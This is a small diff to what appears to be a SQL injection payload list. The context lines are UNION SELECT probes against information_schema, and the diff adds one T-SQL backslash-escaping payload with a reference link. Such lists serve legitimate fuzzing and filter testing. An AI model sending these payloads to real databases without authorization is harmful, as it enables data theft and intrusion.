@@ -551,3 +551,7 @@ binary -1 union select table_name from information_schema.tables
 binary -(1) union select table_name from information_schema.tables
 binary (binary 1) union select table_name from information_schema.tables
 binary (binary 1) union select table_name from information_schema.tables
+
+# werid slash escaping in T-SQL
+# http://websec.ca/kb/sql_injection#MSSQL_Allowed_Intermediary_Chars_AND-OR
+\1=\1AND\1=\1;
